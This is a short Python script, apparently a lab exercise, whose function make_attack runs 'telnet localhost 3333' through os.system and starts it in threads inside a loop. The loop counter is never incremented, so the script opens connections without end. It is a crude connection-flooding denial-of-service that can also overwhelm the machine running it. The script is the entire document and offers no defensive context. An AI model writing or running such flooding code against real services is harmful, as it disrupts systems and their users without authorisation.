from threading import Thread 
from os import system

def make_attack():
    system("telnet localhost 3333")
    
i=0
while i<300 : 
    Thread(target=make_attack).start()